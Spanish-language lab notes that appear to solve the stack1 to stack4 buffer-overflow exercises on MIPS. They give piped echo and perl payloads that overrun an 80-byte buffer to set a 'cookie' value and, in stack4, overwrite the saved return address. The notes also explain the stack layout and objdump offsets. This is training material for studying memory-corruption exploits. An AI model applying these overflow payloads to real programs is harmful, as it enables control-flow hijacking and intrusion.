Copiar los códigos a MIPS.
Compilar en MIPS:	gcc -Wall -O0 stack.c
A stack1.c mandarle los 84 caracteres:	00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA

echo 00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA| ./a.out

El buffer del que lee arranca en 24(fp) hasta fp(103), es decir 80 caracteres.
Inmediatamente despues (o sea, más arriba) esta el valor de la 'cookie'
Llenando el buffer con 80 y sobreescribiendo los 4 bytes (con 4 chars) de la cookie se logra lo pedido.

Stack1 
echo 00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA| ./a.out
Hexa	41 42 43 44 (A lo que tiene que ser igual la cookie)
Deci	65 66 67 68 (Lo que mando con los chars)
Char	A  B  C  D



Stack2
echo -ne '00000000000000000000000000000000000000000000000000000000000000000000000000000000\x05\x03\x02\x01' | ./a.out
Hexa    01 02 03 05


00000000000000000000000000000000000000000000000000000000000000000000000000000000^E^C^B^A
ctrl+shift+E
ctrl+shift+C (problemas por el trap de ctrl+c, termina el programa).
ctrl+shift+B
ctrl+shift+A

Stack 3
Hexa	01 02 00 05
echo -ne '00000000000000000000000000000000000000000000000000000000000000000000000000000000\x05\x00\x02\x01' | ./a.out

Stack 4
perl -e 'print "a"x96 . "\x40\x0c\x40\x00"' | ./a.out

Compilarlo como a los otros.
objdump -d ./a.out
	00400ba0 <stack4>:
	...
	400c3c bne = Si la cookie no es igual al número dado hacer el branch. Sino imprimir "you win!"
	400c40 -->NOP después de de la comparación con el número.
	Entonces si salto a 400c40 (00 40 0c 40) ejecuto el caso exitoso.
Nota 1: En perl es más comodo para imprimir las repeticiones de llenado.
Nota 2: Se imprimen 96 caracteres para llegar hasta el $ra de la función stack4.
	80 para llenar el buffer
	16 para pisar gp y fp y quedar en el $ra












